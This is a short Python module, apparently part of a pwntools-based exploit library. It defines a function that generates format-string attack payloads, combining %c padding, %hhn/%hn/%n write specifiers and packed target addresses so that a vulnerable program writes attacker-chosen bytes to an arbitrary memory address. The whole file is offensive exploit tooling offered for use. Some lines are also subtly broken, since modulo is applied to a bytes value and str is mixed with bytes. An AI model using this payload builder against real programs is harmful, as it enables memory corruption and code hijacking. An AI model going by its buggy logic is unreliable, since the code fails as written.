from ..Utils.pwntools_import import u32, context, flat


def fmt_write2target_payload(msg: bytes, target_addr: int, msg_fmtidx: int, step: int = 1):
    assert step in (1, 2, 4)
    assert context.arch in ('i386', 'amd64')
    
    if msg % step != 0:
        msg += '\0' * (step - (len(msg) % step))

    length, mask = len(msg), (1 << (8 * step)) - 1
    addr_length = context.mask.bit_length() // 8

    display_length = 0
    payload = ''
    for i in range(0, length, step):
        byte = u32(msg[i: i + step].ljust(4, b'\0'))
        if byte != display_length:
            payload += f'%{(byte - display_length) & mask}c'
            display_length = byte
        if step == 1:
            payload += '%{}$hhn'
        elif step == 2:
            payload += '%{}$hn'
        else:
            payload += '%{}$n'

    predict_payload_length = len(payload)
    predict_start_fmtidx = msg_fmtidx + (predict_payload_length) // addr_length + 1
    while True:
        new_payload = payload.format(*[predict_start_fmtidx + i for i in range(length // step)])
        if len(new_payload) <= (predict_start_fmtidx - msg_fmtidx) * addr_length:
            payload = new_payload.ljust((predict_start_fmtidx - msg_fmtidx) * addr_length, '.')
            break
        predict_start_fmtidx += 1

    return payload.encode() + flat(*[target_addr + i for i in range(0, length, step)])

